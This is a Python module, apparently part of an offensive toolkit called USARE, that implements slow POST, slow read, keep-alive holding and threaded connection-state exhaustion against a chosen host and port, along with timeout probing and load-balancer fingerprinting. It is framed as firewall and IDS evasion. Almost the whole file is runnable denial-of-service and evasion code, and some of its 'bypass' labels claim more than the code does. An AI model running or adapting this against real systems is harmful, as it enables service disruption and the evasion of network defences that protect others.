"""
USARE TCP State-Morphing Evasion Module

Implements advanced TCP state manipulation techniques to bypass
stateful inspection firewalls and IDS/IPS systems.

Techniques implemented:
- Slow POST/Read attacks
- TCP connection timeout mapping
- Load balancer detection and bypass
- Connection state exhaustion
- TCP keep-alive manipulation

⚠️  WARNING: STATE_EXHAUST mode is closer to a DoS technique than reconnaissance.
In an authorized engagement context, it could cause unintended service disruption.
Use with caution and proper authorization.
"""

import socket
import time
import random
import threading
import logging
import struct
import select
from typing import Optional, List, Dict, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import asyncio

logger = logging.getLogger("usare.state_morph")

class StateMorphMode(Enum):
    """TCP state-morphing attack variants."""
    SLOW_POST = "slow-post"           # Very slow data transmission
    SLOW_READ = "slow-read"           # Delayed ACK responses
    TIMEOUT_MAPPING = "timeout-mapping"  # Exploit connection timeout differences
    KEEP_ALIVE = "keep-alive"        # TCP keep-alive manipulation
    STATE_EXHAUST = "state-exhaust"   # Flood connection state tables
    LOAD_BALANCER = "load-balancer"   # Load balancer detection and bypass
    ADAPTIVE = "adaptive"             # Auto-select best technique

@dataclass
class StateMorphConfig:
    """Configuration for TCP state-morphing operations."""
    target_ip: str
    target_port: int
    mode: StateMorphMode = StateMorphMode.ADAPTIVE
    timeout: float = 30.0
    max_connections: int = 50
    slow_post_interval: float = 30.0  # Seconds between data chunks
    slow_read_delay: float = 60.0     # Delay before ACK
    keep_alive_interval: float = 10.0  # TCP keep-alive interval
    state_exhaust_rate: int = 10       # Connections per second
    source_ports: List[int] = field(default_factory=lambda: list(range(1024, 65535)))
    user_agents: List[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    ])

@dataclass
class StateMorphResult:
    """Results from state-morphing operations."""
    technique: str
    success: bool
    port_open: bool
    latency_ms: Optional[float] = None
    error: Optional[str] = None
    connections_established: int = 0
    bytes_transmitted: int = 0
    detection_indicators: List[str] = field(default_factory=list)
    bypass_method: Optional[str] = None

class TCPStateMorpher:
    """Advanced TCP state manipulation for evasion."""
    
    def __init__(self, config: StateMorphConfig):
        self.config = config
        self._active_connections: Dict[int, socket.socket] = {}
        self._connection_stats: Dict[int, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        
        # Connection semaphore to prevent file descriptor exhaustion
        # Cap concurrent connections to prevent resource exhaustion on the attacker machine
        max_concurrent = min(config.max_connections, 20)  # Conservative limit
        self._connection_semaphore = threading.Semaphore(max_concurrent)
        
        # Load balancer detection patterns
        self.load_balancer_signatures = {
            'nginx': ['nginx', 'Server: nginx'],
            'haproxy': ['haproxy', 'X-Haproxy'],
            'aws_elb': ['ELB-', 'X-Forwarded-For'],
            'cloudflare': ['cf-ray', 'cloudflare'],
            'f5': ['BIG-IP', 'F5'],
            'apache': ['Apache', 'Server: Apache']
        }
        
    def execute_state_morph(self) -> StateMorphResult:
        """Execute the configured state-morphing attack."""
        logger.info(f"[USARE] Executing {self.config.mode.value} state-morphing on {self.config.target_ip}:{self.config.target_port}")
        
        try:
            if self.config.mode == StateMorphMode.ADAPTIVE:
                return self._adaptive_morph()
            elif self.config.mode == StateMorphMode.SLOW_POST:
                return self._slow_post_attack()
            elif self.config.mode == StateMorphMode.SLOW_READ:
                return self._slow_read_attack()
            elif self.config.mode == StateMorphMode.TIMEOUT_MAPPING:
                return self._timeout_mapping_attack()
            elif self.config.mode == StateMorphMode.KEEP_ALIVE:
                return self._keep_alive_attack()
            elif self.config.mode == StateMorphMode.STATE_EXHAUST:
                return self._state_exhaust_attack()
            elif self.config.mode == StateMorphMode.LOAD_BALANCER:
                return self._load_balancer_attack()
            else:
                raise ValueError(f"Unknown state-morph mode: {self.config.mode}")
                
        except Exception as e:
            logger.error(f"[USARE] State-morph attack failed: {e}")
            return StateMorphResult(
                technique=self.config.mode.value,
                success=False,
                port_open=False,
                error=str(e)
            )
    
    def _adaptive_morph(self) -> StateMorphResult:
        """Adaptive state-morphing that selects best technique based on target."""
        # First, try basic connection to assess target behavior
        basic_result = self._basic_connection_test()
        
        if not basic_result.success:
            return basic_result
        
        # Analyze response characteristics
        response_time = basic_result.latency_ms or 0
        detection_indicators = basic_result.detection_indicators
        
        # Select technique based on target characteristics
        if response_time > 5000:  # Slow responding target
            logger.info("[USARE] Target responds slowly, using timeout mapping")
            self.config.mode = StateMorphMode.TIMEOUT_MAPPING
        elif 'load_balancer' in detection_indicators:
            logger.info("[USARE] Load balancer detected, using load balancer bypass")
            self.config.mode = StateMorphMode.LOAD_BALANCER
        elif 'stateful_firewall' in detection_indicators:
            logger.info("[USARE] Stateful firewall detected, using state exhaustion")
            self.config.mode = StateMorphMode.STATE_EXHAUST
        else:
            logger.info("[USARE] Using default slow-post technique")
            self.config.mode = StateMorphMode.SLOW_POST
        
        # Execute selected technique
        return self.execute_state_morph()
    
    def _basic_connection_test(self) -> StateMorphResult:
        """Test basic connection to gather target intelligence."""
        start_time = time.time()
        sock = None
        detection_indicators = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.config.target_ip, self.config.target_port))
            
            # Send basic HTTP request if port 80/443
            if self.config.target_port in [80, 443, 8080, 8443]:
                request = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"
                sock.send(request.encode())
                
                # Read response headers
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                
                # Analyze response for detection indicators
                response_lower = response.lower()
                
                # Check for load balancer signatures
                for lb_type, signatures in self.load_balancer_signatures.items():
                    if any(sig.lower() in response_lower for sig in signatures):
                        detection_indicators.append(f'load_balancer_{lb_type}')
                
                # Check for stateful firewall indicators
                if 'connection: keep-alive' in response_lower:
                    detection_indicators.append('keep_alive_supported')
                
                if 'server:' in response_lower:
                    detection_indicators.append('server_banner_present')
            
            latency = (time.time() - start_time) * 1000
            
            return StateMorphResult(
                technique="basic_test",
                success=True,
                port_open=True,
                latency_ms=latency,
                detection_indicators=detection_indicators
            )
            
        except socket.timeout:
            detection_indicators.append('timeout_detected')
            return StateMorphResult(
                technique="basic_test",
                success=False,
                port_open=False,
                detection_indicators=detection_indicators,
                error="Connection timeout"
            )
        except Exception as e:
            return StateMorphResult(
                technique="basic_test",
                success=False,
                port_open=False,
                error=str(e)
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _slow_post_attack(self) -> StateMorphResult:
        """Slow POST attack - send data very slowly to keep connection open."""
        logger.info(f"[USARE] Starting slow POST attack (interval: {self.config.slow_post_interval}s)")
        
        sock = None
        connections_established = 0
        bytes_transmitted = 0
        
        try:
            # Establish connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.config.target_ip, self.config.target_port))
            connections_established = 1
            
            # Send HTTP POST request with large content-length
            boundary = f"----WebKitFormBoundary{random.randint(1000000000, 9999999999)}"
            content_length = 1000000  # 1MB claim
            
            headers = (
                f"POST /upload HTTP/1.1\r\n"
                f"Host: {self.config.target_ip}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            
            sock.send(headers.encode())
            bytes_transmitted += len(headers)
            
            # Send data very slowly
            chunk_size = 1  # 1 byte at a time for maximum effect
            total_sent = 0
            
            while total_sent < content_length and not self._stop_event.is_set():
                # Send a tiny chunk
                chunk = b"A" * chunk_size
                sock.send(chunk)
                bytes_transmitted += chunk_size
                total_sent += chunk_size
                
                # Wait before next chunk
                time.sleep(self.config.slow_post_interval)
                
                # Check if connection is still alive
                try:
                    sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                except socket.error:
                    break
            
            # Try to read response
            try:
                response = sock.recv(1024)
                port_open = len(response) > 0
            except socket.timeout:
                port_open = True  # Connection was kept open
            except Exception:
                port_open = False
            
            return StateMorphResult(
                technique="slow_post",
                success=True,
                port_open=port_open,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                bypass_method="connection_timeout_evasion"
            )
            
        except Exception as e:
            return StateMorphResult(
                technique="slow_post",
                success=False,
                port_open=False,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                error=str(e)
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _slow_read_attack(self) -> StateMorphResult:
        """Slow read attack - delay ACK responses."""
        logger.info(f"[USARE] Starting slow read attack (delay: {self.config.slow_read_delay}s)")
        
        sock = None
        connections_established = 0
        bytes_transmitted = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.config.target_ip, self.config.target_port))
            connections_established = 1
            
            # Send request
            request = f"GET /large-file HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"
            sock.send(request.encode())
            bytes_transmitted += len(request)
            
            # Read response headers quickly
            response = b""
            while b"\r\n\r\n" not in response:
                chunk = sock.recv(1)
                if not chunk:
                    break
                response += chunk
            
            # Now delay reading the body
            time.sleep(self.config.slow_read_delay)
            
            # Try to read some body data
            try:
                body = sock.recv(1024)
                port_open = len(body) > 0
                bytes_transmitted += len(body)
            except socket.timeout:
                port_open = True  # Server waited for us
            except Exception:
                port_open = False
            
            return StateMorphResult(
                technique="slow_read",
                success=True,
                port_open=port_open,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                bypass_method="ack_delay_evasion"
            )
            
        except Exception as e:
            return StateMorphResult(
                technique="slow_read",
                success=False,
                port_open=False,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                error=str(e)
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _timeout_mapping_attack(self) -> StateMorphResult:
        """Timeout mapping attack - exploit different timeout behaviors."""
        logger.info("[USARE] Starting timeout mapping attack")
        
        results = []
        connections_established = 0
        bytes_transmitted = 0
        
        # Test different timeout scenarios
        timeout_tests = [
            (5.0, "short_timeout"),
            (15.0, "medium_timeout"),
            (30.0, "long_timeout"),
            (60.0, "very_long_timeout")
        ]
        
        for timeout_val, test_name in timeout_tests:
            if self._stop_event.is_set():
                break
                
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout_val)
                start_time = time.time()
                
                sock.connect((self.config.target_ip, self.config.target_port))
                connections_established += 1
                
                # Send minimal request
                request = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"
                sock.send(request.encode())
                bytes_transmitted += len(request)
                
                # Wait for response or timeout
                try:
                    response = sock.recv(1024)
                    actual_timeout = (time.time() - start_time) * 1000
                    
                    results.append({
                        'test': test_name,
                        'timeout_set': timeout_val,
                        'actual_timeout': actual_timeout,
                        'response_received': len(response) > 0
                    })
                    
                except socket.timeout:
                    actual_timeout = (time.time() - start_time) * 1000
                    results.append({
                        'test': test_name,
                        'timeout_set': timeout_val,
                        'actual_timeout': actual_timeout,
                        'response_received': False
                    })
                
            except Exception as e:
                logger.debug(f"[USARE] Timeout test {test_name} failed: {e}")
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
            
            # Small delay between tests
            time.sleep(1)
        
        # Analyze results to find optimal timeout
        successful_tests = [r for r in results if r['response_received']]
        port_open = len(successful_tests) > 0
        
        return StateMorphResult(
            technique="timeout_mapping",
            success=len(results) > 0,
            port_open=port_open,
            connections_established=connections_established,
            bytes_transmitted=bytes_transmitted,
            bypass_method="timeout_optimization"
        )
    
    def _keep_alive_attack(self) -> StateMorphResult:
        """TCP keep-alive manipulation attack."""
        logger.info(f"[USARE] Starting keep-alive attack (interval: {self.config.keep_alive_interval}s)")
        
        sock = None
        connections_established = 0
        bytes_transmitted = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Set keep-alive parameters if available
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, self.config.keep_alive_interval)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            except AttributeError:
                pass  # May not be available on all systems
            
            sock.settimeout(self.config.timeout)
            sock.connect((self.config.target_ip, self.config.target_port))
            connections_established = 1
            
            # Send initial request
            request = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\nConnection: keep-alive\r\n\r\n"
            sock.send(request.encode())
            bytes_transmitted += len(request)
            
            # Read initial response
            response = sock.recv(4096)
            initial_response_size = len(response)
            
            # Keep connection alive with periodic probes
            keep_alive_count = 0
            start_time = time.time()
            
            while (time.time() - start_time) < 60 and not self._stop_event.is_set():  # Run for 1 minute
                time.sleep(self.config.keep_alive_interval)
                keep_alive_count += 1
                
                try:
                    # Send a small keep-alive probe
                    probe = b"\r\n"
                    sock.send(probe)
                    bytes_transmitted += len(probe)
                    
                    # Check for response
                    ready = select.select([sock], [], [], 1.0)
                    if ready[0]:
                        data = sock.recv(1024)
                        if not data:  # Connection closed
                            break
                
                except (socket.error, socket.timeout):
                    break
            
            port_open = keep_alive_count > 0 or initial_response_size > 0
            
            return StateMorphResult(
                technique="keep_alive",
                success=True,
                port_open=port_open,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                bypass_method="keep_alive_evasion"
            )
            
        except Exception as e:
            return StateMorphResult(
                technique="keep_alive",
                success=False,
                port_open=False,
                connections_established=connections_established,
                bytes_transmitted=bytes_transmitted,
                error=str(e)
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _state_exhaust_attack(self) -> StateMorphResult:
        """State table exhaustion attack."""
        logger.info(f"[USARE] Starting state exhaustion attack (rate: {self.config.state_exhaust_rate}/s)")
        
        connections_established = 0
        bytes_transmitted = 0
        threads = []
        
        def create_connection():
            nonlocal connections_established, bytes_transmitted
            
            # Use semaphore to prevent file descriptor exhaustion
            with self._connection_semaphore:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5.0)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Send minimal data to establish state
                    request = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"
                    sock.send(request.encode())
                    
                    with self._lock:
                        connections_established += 1
                        bytes_transmitted += len(request)
                    
                    # Keep connection open without reading response
                    time.sleep(30)  # Keep open for 30 seconds
                    
                except Exception:
                    pass
                finally:
                    if sock:
                        try:
                            sock.close()
                        except Exception:
                            pass
        
        # Launch multiple connection threads
        for i in range(min(self.config.max_connections, 50)):
            if self._stop_event.is_set():
                break
                
            thread = threading.Thread(target=create_connection)
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Rate limiting
            time.sleep(1.0 / self.config.state_exhaust_rate)
        
        # Wait for threads to complete
        for thread in threads:
            thread.join(timeout=35)
        
        port_open = connections_established > 0
        
        return StateMorphResult(
            technique="state_exhaust",
            success=connections_established > 0,
            port_open=port_open,
            connections_established=connections_established,
            bytes_transmitted=bytes_transmitted,
            bypass_method="state_table_exhaustion"
        )
    
    def _load_balancer_attack(self) -> StateMorphResult:
        """Load balancer detection and bypass attack."""
        logger.info("[USARE] Starting load balancer detection and bypass")
        
        # Test multiple source ports to detect load balancing
        source_port_results = []
        connections_established = 0
        bytes_transmitted = 0
        
        for i in range(10):  # Test 10 different source ports
            if self._stop_event.is_set():
                break
                
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Bind to specific source port
                source_port = random.choice(self.config.source_ports)
                sock.bind(('', source_port))
                sock.settimeout(10.0)
                
                start_time = time.time()
                sock.connect((self.config.target_ip, self.config.target_port))
                connections_established += 1
                
                # Send request and capture response
                request = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n"
                sock.send(request.encode())
                bytes_transmitted += len(request)
                
                response = sock.recv(4096)
                latency = (time.time() - start_time) * 1000
                
                # Analyze response for load balancer indicators
                response_str = response.decode('utf-8', errors='ignore')
                response_lower = response_str.lower()
                
                detected_lb = None
                for lb_type, signatures in self.load_balancer_signatures.items():
                    if any(sig.lower() in response_lower for sig in signatures):
                        detected_lb = lb_type
                        break
                
                source_port_results.append({
                    'source_port': source_port,
                    'latency': latency,
                    'response_size': len(response),
                    'load_balancer': detected_lb,
                    'server_header': self._extract_server_header(response_str)
                })
                
            except Exception as e:
                logger.debug(f"[USARE] Load balancer test from port {source_port} failed: {e}")
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
        
        # Analyze results for load balancing patterns
        port_open = len(source_port_results) > 0
        detected_balancers = set(r['load_balancer'] for r in source_port_results if r['load_balancer'])
        bypass_method = None
        
        if len(detected_balancers) > 1:
            bypass_method = "multi_lb_bypass"
        elif len(detected_balancers) == 1:
            bypass_method = f"{list(detected_balancers)[0]}_bypass"
        elif len(source_port_results) > 1:
            # Check for different server headers indicating load balancing
            server_headers = set(r['server_header'] for r in source_port_results if r['server_header'])
            if len(server_headers) > 1:
                bypass_method = "server_header_variation_bypass"
        
        return StateMorphResult(
            technique="load_balancer",
            success=len(source_port_results) > 0,
            port_open=port_open,
            connections_established=connections_established,
            bytes_transmitted=bytes_transmitted,
            detection_indicators=list(detected_balancers),
            bypass_method=bypass_method
        )
    
    def _extract_server_header(self, response: str) -> Optional[str]:
        """Extract Server header from HTTP response."""
        for line in response.split('\r\n'):
            if line.lower().startswith('server:'):
                return line.split(':', 1)[1].strip()
        return None
    
    def stop(self):
        """Stop all ongoing state-morphing operations."""
        logger.info("[USARE] Stopping state-morphing operations")
        self._stop_event.set()
        
        # Close all active connections
        with self._lock:
            for conn_id, sock in self._active_connections.items():
                try:
                    sock.close()
                except Exception:
                    pass
            self._active_connections.clear()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current state-morphing statistics."""
        with self._lock:
            return {
                'active_connections': len(self._active_connections),
                'connection_stats': dict(self._connection_stats),
                'mode': self.config.mode.value,
                'target': f"{self.config.target_ip}:{self.config.target_port}"
            }

# Example usage and testing
def main():
    """Example usage of TCP state morpher."""
    config = StateMorphConfig(
        target_ip="example.com",
        target_port=80,
        mode=StateMorphMode.ADAPTIVE
    )
    
    morpher = TCPStateMorpher(config)
    
    try:
        result = morpher.execute_state_morph()
        print(f"Technique: {result.technique}")
        print(f"Success: {result.success}")
        print(f"Port Open: {result.port_open}")
        print(f"Connections: {result.connections_established}")
        print(f"Bytes Transmitted: {result.bytes_transmitted}")
        if result.bypass_method:
            print(f"Bypass Method: {result.bypass_method}")
        if result.error:
            print(f"Error: {result.error}")
    finally:
        morpher.stop()

if __name__ == "__main__":
    main()
